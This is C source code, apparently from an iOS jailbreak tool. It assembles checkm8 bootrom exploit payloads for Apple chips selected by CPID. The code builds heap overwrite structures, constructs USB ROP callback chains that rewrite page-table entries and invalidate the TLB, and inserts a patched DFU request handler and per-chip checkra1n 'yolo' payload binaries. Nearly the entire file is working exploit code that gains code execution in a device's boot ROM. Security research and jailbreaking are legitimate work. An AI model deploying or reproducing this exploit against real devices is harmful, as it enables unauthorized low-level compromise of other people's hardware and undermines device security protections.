#include <exploit/payload.h>

uint8_t *create_gaster_overwrite_for_device(struct DeviceConfiguration *deviceConfig, struct PayloadConfiguration *payloadConfig, size_t *overwriteSize) {
    if (deviceConfig->cpid == 0x7000 || deviceConfig->cpid == 0x7001 || deviceConfig->cpid == 0x8000 || deviceConfig->cpid == 0x8003) {
        checkm8_overwrite_t checkm8Overwrite;
        memset(&checkm8Overwrite, 0, sizeof(checkm8_overwrite_t));
        checkm8Overwrite.callback.callback = payloadConfig->insecureMemoryBase;
        *overwriteSize = sizeof(checkm8Overwrite);
        uint8_t *overwrite = malloc(*overwriteSize);
        memcpy(overwrite, &checkm8Overwrite, *overwriteSize);
        return overwrite;
    } else {
        checkm8_overwrite_t checkm8Overwrite;
        memset(&checkm8Overwrite, 0, sizeof(checkm8_overwrite_t));
        checkm8Overwrite.callback.callback = payloadConfig->nopGadget;
        checkm8Overwrite.callback.next = payloadConfig->insecureMemoryBase;
        checkm8Overwrite.heap_pad_0 = 0xF7F6F5F4F3F2F1F0;
        checkm8Overwrite.heap_pad_1 = 0xFFFEFDFCFBFAF9F8;
        *overwriteSize = sizeof(checkm8Overwrite);
        uint8_t *overwrite = malloc(*overwriteSize);
        memcpy(overwrite, &checkm8Overwrite, *overwriteSize);
        return overwrite;
    }
    return NULL;
}

size_t generate_usb_rop_callbacks(uint8_t *buffer, uint64_t address, callback_t *callbacks, size_t callbackCount, struct PayloadConfiguration *payloadConfig) {
    uint8_t block0[MAX_BLOCK_SIZE], block1[MAX_BLOCK_SIZE];
	size_t i, j, sz = 0, block0Size, block1Size;
	uint64_t reg;

	for(i = 0; i < callbackCount; i += 5) {
		block1Size = block0Size = 0;
		for(j = 0; j < 5; ++j) {
			address += MAX_BLOCK_SIZE / 5;
			if(j == 4) {
				address += MAX_BLOCK_SIZE;
			}
			if(i + j < callbackCount - 1) {
				reg = payloadConfig->functionGadget;
				memcpy(block0 + block0Size, &reg, sizeof(reg));
				block0Size += sizeof(reg);
				reg = address;
				memcpy(block0 + block0Size, &reg, sizeof(reg));
				block0Size += sizeof(reg);
				reg = callbacks[i + j].arg;
				memcpy(block1 + block1Size, &reg, sizeof(reg));
				block1Size += sizeof(reg);
				reg = callbacks[i + j].func;
				memcpy(block1 + block1Size, &reg, sizeof(reg));
				block1Size += sizeof(reg);
			} else if(i + j == callbackCount - 1) {
				reg = payloadConfig->functionGadget;
				memcpy(block0 + block0Size, &reg, sizeof(reg));
				block0Size += sizeof(reg);
				reg = 0;
				memcpy(block0 + block0Size, &reg, sizeof(reg));
				block0Size += sizeof(reg);
				reg = callbacks[i + j].arg;
				memcpy(block1 + block1Size, &reg, sizeof(reg));
				block1Size += sizeof(reg);
				reg = callbacks[i + j].func;
				memcpy(block1 + block1Size, &reg, sizeof(reg));
				block1Size += sizeof(reg);
			} else {
				reg = 0;
				memcpy(block0 + block0Size, &reg, sizeof(reg));
				block0Size += sizeof(reg);
				reg = 0;
				memcpy(block0 + block0Size, &reg, sizeof(reg));
				block0Size += sizeof(reg);
			}
		}
		memcpy(buffer + sz, block0, block0Size);
		sz += block0Size;
		memcpy(buffer + sz, block1, block1Size);
		sz += block1Size;
	}
	return sz;
}

#include <exploit/gaster/payload_A9.h>
#include <exploit/gaster/payload_notA9.h>
#include <exploit/gaster/payload_handle_checkm8_request.h>

uint8_t *create_gaster_payload_for_device(struct DeviceConfiguration *deviceConfig, struct PayloadConfiguration *payloadConfig, size_t *payloadSize) {

    struct {
		uint64_t pwnd[2], payload_dest, dfu_handle_bus_reset, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, ttbr0_vrom_addr, patch_addr;
	} A9;
	struct {
		uint64_t pwnd[2], payload_dest, dfu_handle_bus_reset, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, patch_addr;
	} notA9;
	struct {
		uint64_t handle_interface_request, insecure_memory_base, exec_magic, done_magic, memc_magic, memcpy_addr, usb_core_do_transfer;
	} handle_checkm8_request;
	callback_t callbacks[] = {
		{ payloadConfig->ttbr0Write, payloadConfig->insecureMemoryBase },
		{ payloadConfig->tlbi, 0 },
		{ payloadConfig->insecureMemoryBase + ARM_16K_TT_L2_SIZE + payloadConfig->ttbr0SRAMOffset + 2 * sizeof(uint64_t), 0 },
		{ payloadConfig->ttbr0Write, payloadConfig->ttbr0Address },
		{ payloadConfig->tlbi, 0 },
		{ payloadConfig->retGadget, 0 }
	};
    size_t data_sz, payload_sz, request_handler_payload_size;
    uint8_t *data, *payload, *request_handler_payload;
    uint64_t reg;

    if (deviceConfig->cpid == 0x8000 || deviceConfig->cpid == 0x8003) {
        if (payload_A9_len > sizeof(A9)) {
            payload = malloc(payload_A9_len);
            memcpy(payload, payload_A9, payload_A9_len);
            payload_sz = payload_A9_len - sizeof(A9);
        } else {
            payload = NULL;
            payload_sz = 0;
        }
    } else if (deviceConfig->cpid >= 0x7000 && deviceConfig->cpid <= 0x8015) {
        if (payload_notA9_len > sizeof(notA9)) {
            payload = malloc(payload_notA9_len);
            memcpy(payload, payload_notA9, payload_notA9_len);
            payload_sz = payload_notA9_len - sizeof(notA9);
        } else {
            payload = NULL;
            payload_sz = 0;
        }
    } else {
        payload = NULL;
        payload_sz = 0;
        LOG(LOG_ERROR, "Failed to prepare payload for device with CPID 0x%x.", deviceConfig->cpid);
    }

    if (payload != NULL) {
        if (payload_handle_checkm8_request_len > sizeof(handle_checkm8_request)) {
            request_handler_payload = malloc(payload_handle_checkm8_request_len);
            memcpy(request_handler_payload, payload_handle_checkm8_request, payload_handle_checkm8_request_len);
            request_handler_payload_size = payload_handle_checkm8_request_len - sizeof(handle_checkm8_request);
            if (deviceConfig->cpid == 0x8000 || deviceConfig->cpid == 0x8003) {
                data = calloc(1, payload_sz + sizeof(A9) + request_handler_payload_size + sizeof(handle_checkm8_request));
            } else if (deviceConfig->cpid == 0x7000 || deviceConfig->cpid == 0x7001) {
                data = calloc(1, payload_sz + sizeof(notA9) + request_handler_payload_size + sizeof(handle_checkm8_request));
            } else {
                data = calloc(1, DFU_MAX_TRANSFER_SIZE + payload_sz + sizeof(notA9) + request_handler_payload_size + sizeof(handle_checkm8_request));
            }
        } else {
            request_handler_payload = NULL;
            request_handler_payload_size = 0;
            data = NULL;
            return NULL;
        }

        if (data != NULL) {
            LOG(LOG_VERBOSE, "Preparing payload for device with CPID 0x%x...", deviceConfig->cpid);
            if (deviceConfig->cpid >= 0x8001 && deviceConfig->cpid <= 0x8015 && deviceConfig->cpid != 0x8003) {
                reg = 0x1000006A5;
                memcpy(data + payloadConfig->ttbr0VROMOffset, &reg, sizeof(reg));
                reg = 0x60000100000625;
                memcpy(data + payloadConfig->ttbr0VROMOffset + sizeof(reg), &reg, sizeof(reg));
                reg = 0x60000180000625;
                memcpy(data + payloadConfig->ttbr0SRAMOffset, &reg, sizeof(reg));
                reg = 0x1800006A5;
                memcpy(data + payloadConfig->ttbr0SRAMOffset + sizeof(reg), &reg, sizeof(reg));
                generate_usb_rop_callbacks(data + offsetof(dfu_callback_t, callback), payloadConfig->insecureMemoryBase, callbacks, sizeof(callbacks) / sizeof(callbacks[0]), payloadConfig);
                data_sz = payloadConfig->ttbr0SRAMOffset + 2 * sizeof(reg);
            } else {
                data_sz = 0;
            }

            memcpy(data + data_sz, payload, payload_sz);
            data_sz += payload_sz;

            char *pwndString = " PWND:[checkm8]";

            if (deviceConfig->cpid == 0x8000 || deviceConfig->cpid == 0x8003) {
                memset(A9.pwnd, 0, sizeof(A9.pwnd));
                memcpy(A9.pwnd, pwndString, strlen(pwndString));
                A9.payload_dest = payloadConfig->bootTrampolineEnd - request_handler_payload_size - sizeof(handle_checkm8_request);
                A9.dfu_handle_bus_reset = payloadConfig->dfu_handle_bus_reset_address;
                A9.dfu_handle_request = payloadConfig->dfu_handle_request_address;
                A9.payload_off = payload_sz + sizeof(A9);
                A9.payload_sz = request_handler_payload_size + sizeof(handle_checkm8_request);
                A9.memcpy_addr = payloadConfig->memcpyAddress;
                A9.gUSBSerialNumber = payloadConfig->gUSBSerialNumber;
                A9.usb_create_string_descriptor = payloadConfig->usb_create_string_descriptor;
                A9.usb_serial_number_string_descriptor = payloadConfig->usb_serial_number_string_descriptor;
                A9.ttbr0_vrom_addr = payloadConfig->ttbr0Address + payloadConfig->ttbr0VROMOffset;
                A9.patch_addr = payloadConfig->patchAddress;
                memcpy(data + data_sz, &A9, sizeof(A9));
                data_sz += sizeof(A9);
                memcpy(data + data_sz, request_handler_payload, request_handler_payload_size);
                data_sz += request_handler_payload_size;
                handle_checkm8_request.handle_interface_request = payloadConfig->handle_interface_request;
                handle_checkm8_request.insecure_memory_base = payloadConfig->insecureMemoryBase;
                handle_checkm8_request.exec_magic = EXEC_MAGIC;
                handle_checkm8_request.done_magic = DONE_MAGIC;
                handle_checkm8_request.memc_magic = MEMC_MAGIC;
                handle_checkm8_request.memcpy_addr = payloadConfig->memcpyAddress;
                handle_checkm8_request.usb_core_do_transfer = payloadConfig->usb_core_do_transfer;
                memcpy(data + data_sz, &handle_checkm8_request, sizeof(handle_checkm8_request));
                data_sz += sizeof(handle_checkm8_request);
            } else {
                memset(notA9.pwnd, 0, sizeof(notA9.pwnd));
				memcpy(notA9.pwnd, pwndString, strlen(pwndString));
				notA9.payload_dest = payloadConfig->bootTrampolineEnd - request_handler_payload_size - sizeof(handle_checkm8_request);
				notA9.dfu_handle_bus_reset = payloadConfig->dfu_handle_bus_reset_address;
				notA9.dfu_handle_request = payloadConfig->dfu_handle_request_address;
				notA9.payload_off = payload_sz + sizeof(notA9);
				notA9.payload_sz = request_handler_payload_size + sizeof(handle_checkm8_request);
				notA9.memcpy_addr = payloadConfig->memcpyAddress;
				notA9.gUSBSerialNumber = payloadConfig->gUSBSerialNumber;
				notA9.usb_create_string_descriptor = payloadConfig->usb_create_string_descriptor;
				notA9.usb_serial_number_string_descriptor = payloadConfig->usb_serial_number_string_descriptor;
				notA9.patch_addr = payloadConfig->patchAddress;
				if(deviceConfig->cpid == 0x8001 || deviceConfig->cpid == 0x8010 || deviceConfig->cpid == 0x8011 || deviceConfig->cpid == 0x8012 || deviceConfig->cpid == 0x8015) {
					notA9.patch_addr += ARM_16K_TT_L2_SIZE;
				}
				memcpy(data + data_sz, &notA9, sizeof(notA9));
				data_sz += sizeof(notA9);
				memcpy(data + data_sz, request_handler_payload, request_handler_payload_size);
				data_sz += request_handler_payload_size;
				handle_checkm8_request.handle_interface_request = payloadConfig->handle_interface_request;
				handle_checkm8_request.insecure_memory_base = payloadConfig->insecureMemoryBase;
				handle_checkm8_request.exec_magic = EXEC_MAGIC;
				handle_checkm8_request.done_magic = DONE_MAGIC;
				handle_checkm8_request.memc_magic = MEMC_MAGIC;
				handle_checkm8_request.memcpy_addr = payloadConfig->memcpyAddress;
				handle_checkm8_request.usb_core_do_transfer = payloadConfig->usb_core_do_transfer;
				memcpy(data + data_sz, &handle_checkm8_request, sizeof(handle_checkm8_request));
				data_sz += sizeof(handle_checkm8_request);
            }

            *payloadSize = data_sz;
            return (uint8_t *)data;
        }
        return NULL;
    }

    return NULL;
}

uint8_t *create_pongo_overwrite_for_device(struct PayloadConfiguration *payloadConfig, size_t *overwriteSize) {
    LOG(LOG_VERBOSE, "Preparing overwrite for YoloDFU mode.");
    uint64_t *overwrite = malloc(0x30);
    overwrite[5] = payloadConfig->insecureMemoryBase;
    *overwriteSize = 0x30;
    return (uint8_t *)overwrite;
}

#include <exploit/checkra1n/yolo_t8015.h>
#include <exploit/checkra1n/yolo_t8011.h>
#include <exploit/checkra1n/yolo_t8010.h>
#include <exploit/checkra1n/yolo_s8003.h>
#include <exploit/checkra1n/yolo_s8001.h>
#include <exploit/checkra1n/yolo_s8000.h>
#include <exploit/checkra1n/yolo_t7001.h>
#include <exploit/checkra1n/yolo_t7000.h>
uint8_t *create_pongo_payload_for_device(struct DeviceConfiguration *deviceConfig, size_t *payloadSize) {
    LOG(LOG_VERBOSE, "Preparing YoloDFU payload for CPID 0x%x.", deviceConfig->cpid);
    switch (deviceConfig->cpid) {
        case 0x8015:
            *payloadSize = yolo_t8015_bin_len;
            return (uint8_t *)yolo_t8015_bin;
        case 0x8011:
            *payloadSize = yolo_t8011_bin_len;
            return (uint8_t *)yolo_t8011_bin;
        case 0x8010:
            *payloadSize = yolo_t8010_bin_len;
            return (uint8_t *)yolo_t8010_bin;
        case 0x8003:
            *payloadSize = yolo_s8003_bin_len;
            return (uint8_t *)yolo_s8003_bin;
        case 0x8001:
            *payloadSize = yolo_s8001_bin_len;
            return (uint8_t *)yolo_s8001_bin;
        case 0x8000:
            *payloadSize = yolo_s8000_bin_len;
            return (uint8_t *)yolo_s8000_bin;
        case 0x7001:
            *payloadSize = yolo_t7001_bin_len;
            return (uint8_t *)yolo_t7001_bin;
        case 0x7000:
            *payloadSize = yolo_t7000_bin_len;
            return (uint8_t *)yolo_t7000_bin;
        default:
            LOG(LOG_ERROR, "Failed to prepare payload for device with CPID 0x%x.", deviceConfig->cpid);
            return NULL;
    }
}